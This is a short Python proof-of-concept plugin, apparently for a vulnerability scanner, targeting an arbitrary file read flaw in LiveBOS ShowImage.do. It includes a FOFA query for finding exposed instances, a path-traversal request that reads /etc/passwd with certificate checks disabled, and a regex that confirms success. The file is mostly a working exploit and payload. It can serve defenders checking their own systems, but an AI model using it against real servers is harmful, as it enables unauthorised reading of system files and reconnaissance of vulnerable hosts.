#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'LiveBOS ShowImage.do 任意文件读取',

      'level'     :   'medium',

      'FOFA'      :   'app="LiveBOS-框架"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/feed/ShowImage.do;.js.jsp?type=&imgName=../../../../../../../../../../../../../../../etc/passwd'
  url1 = url + target
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    # print(res.text)
    if res.status_code == 200 and re.search(r'root:.*?:[0-9]*:[0-9]*:',res.text,re.S):
      # ret['huixian'] = res.text
      res.close()
      ret['url'] = url1
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret